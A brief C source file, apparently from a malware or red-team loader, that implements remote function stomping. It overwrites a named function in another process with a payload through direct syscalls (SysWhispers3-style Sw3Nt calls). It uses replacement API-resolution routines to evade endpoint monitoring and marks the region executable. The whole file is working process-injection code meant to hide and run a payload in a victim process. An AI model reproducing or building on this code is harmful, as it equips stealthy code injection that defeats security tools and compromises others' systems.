#include "common.h"
#include "syscalls.h"

PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize)
{
	// Get a handle on victim function [DONT USE SOMETHING THAT IS ACTUALLY CALLED!!]
	PVOID pStomp = GetProcAddressReplacement(GetModuleHandleReplacement(sStompModule), sStompFunction);

	// Overwrite process function
	SIZE_T sNumBytes = NULL;
	PVOID oldProt = NULL;
	PVOID pStomp2 = pStomp;
	PVOID pStomp3 = pStomp;

	//STATUS = Sw3NtAllocateVirtualMemory(hProcess, pAddress, 0, &rSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	Sw3NtProtectVirtualMemory(hProcess, &pStomp, &sPayloadSize, PAGE_READWRITE, &oldProt);
	Sw3NtWriteVirtualMemory(hProcess, pStomp2, pPayload, sPayloadSize, &sNumBytes);
	Sw3NtProtectVirtualMemory(hProcess, &pStomp2, &sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProt);

	return pStomp3;
}